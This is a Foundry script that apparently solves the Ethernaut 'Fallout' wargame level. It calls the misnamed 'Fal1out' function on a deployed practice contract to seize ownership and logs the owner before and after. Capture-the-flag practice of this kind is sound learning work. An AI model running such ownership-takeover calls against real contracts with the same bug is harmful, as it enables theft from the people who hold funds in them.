// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "../src/02_Fallout.sol";
import {Script, console} from "forge-std/Script.sol";

contract FalloutSolve is Script {
    Fallout fallout = Fallout(0x85bF656110e6C6A08C75CDb8DF058BC548F4Ce9d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Fallout Owner Before#", fallout.owner());
        fallout.Fal1out();
        console.log("Fallout Owner After#", fallout.owner());

        vm.stopBroadcast();
    }
}
